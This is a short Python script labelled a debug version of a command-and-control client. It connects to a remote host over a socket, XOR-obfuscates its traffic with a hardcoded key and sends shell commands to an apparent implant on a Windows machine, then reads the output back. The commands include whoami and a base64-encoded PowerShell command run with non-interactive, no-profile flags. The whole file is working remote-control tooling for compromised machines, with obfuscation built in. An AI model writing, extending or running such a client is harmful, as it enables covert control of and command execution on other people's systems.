#!/usr/bin/env python3
"""
C2 Client — debug version
"""
import socket, sys, base64

XOR_KEY = bytes([0x42,0x7A,0x1F,0xE3,0x9C,0x55,0xB0,0x2D])

def xor(b):
    return bytes(b[i] ^ XOR_KEY[i%len(XOR_KEY)] for i in range(len(b)))

def recv_until(s, timeout=10):
    buf = b""
    s.settimeout(timeout)
    try:
        while True:
            c = s.recv(1)
            if not c: break
            buf += xor(c)
            if b"__C2DONE__" in buf:
                raw = buf[:buf.index(b"__C2DONE__")]
                return raw
    except socket.timeout:
        pass
    except ConnectionResetError:
        return None
    return buf

def send_raw(s, cmd):
    data = (cmd + "\necho __C2DONE__\n").encode()
    xored = xor(data)
    print(f"[debug] Sending {len(data)} bytes: {data[:80]}...")
    print(f"[debug] XORed:   {xored[:40].hex()}...")
    s.sendall(xored)

def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "192.168.30.17"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 54321
    s = socket.socket()
    s.connect((host, port))
    print(f"[+] Connected to {host}:{port}")

    # Test 1: raw whoami (cmd.exe)
    print("\n=== Test 1: raw whoami ===")
    send_raw(s, "whoami")
    raw = recv_until(s)
    if raw:
        print(f"[debug] Received {len(raw)} bytes")
        print(f"[debug] Raw hex: {raw[:60].hex()}")
        print(f"[debug] Text:    {raw.decode('gbk', errors='replace')[:200]}")
        print(f"[debug] Repr:    {raw[:60]!r}")
    else:
        print("[-] No response")

    # Try with -NoLogo to suppress banner
    print("\n=== Test 2: powershell whoami ===")
    b64 = base64.b64encode(b"whoami").decode()
    send_raw(s, f"powershell -NoP -NonI -EncodedCommand {b64}")
    raw = recv_until(s)
    if raw:
        print(f"[debug] Received {len(raw)} bytes")
        print(f"[debug] Raw hex: {raw[:60].hex()}")
        print(f"[debug] Text:    {raw.decode('gbk', errors='replace')[:200]}")
    else:
        print("[-] No response")

    # Test 3: what if we just send nothing and read
    print("\n=== Test 3: Read without sending ===")
    s.settimeout(5)
    try:
        junk = b""
        while True:
            c = s.recv(1)
            if not c: break
            junk += xor(c)
    except socket.timeout:
        pass
    if junk:
        print(f"[debug] Got {len(junk)} unsolicited bytes")
        print(f"[debug] Hex: {junk[:60].hex()}")
        print(f"[debug] Text: {junk.decode('gbk',errors='replace')[:200]}")
    else:
        print("[debug] No unsolicited data (good)")

    s.close()

if __name__ == "__main__":
    main()
